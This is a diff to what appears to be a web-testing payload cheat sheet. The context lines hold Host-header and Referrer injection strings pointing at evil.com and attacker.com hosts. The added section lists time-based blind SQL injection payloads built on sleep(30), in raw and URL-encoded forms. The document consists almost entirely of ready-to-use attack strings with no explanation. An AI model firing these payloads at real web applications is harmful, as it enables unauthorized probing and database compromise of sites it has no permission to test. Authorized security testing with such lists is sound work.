@@ -53,3 +53,17 @@ Referrer: https://evil.com
 localhost.attacker.com or localhostattacker.com
 Host: redacted.com?anythin<b>imran</b> or Host: redacted.com?"><a href='evil.com
 ```
+
+SQL INJECT
+```
+'and(select*from(select+sleep(30))a/**/union/**/select+1)='
+%27and%28select%2Afrom%28select%2Bsleep%2830%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
+'XOR(if(now()=sysdate(),sleep(30),0))OR'
+%27XOR(if(now()%3dsysdate(),sleep(30),0))OR%27
+"and(select*from(select+sleep(30))a/**/union/**/select+1)="
+%22and%28select%2Afrom%28select%2Bsleep%2830%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%22
+"XOR(if(now()=sysdate(),sleep(30),0))OR"
+%22XOR(if(now()%3dsysdate(),sleep(30),0))OR%22
+```
+
+
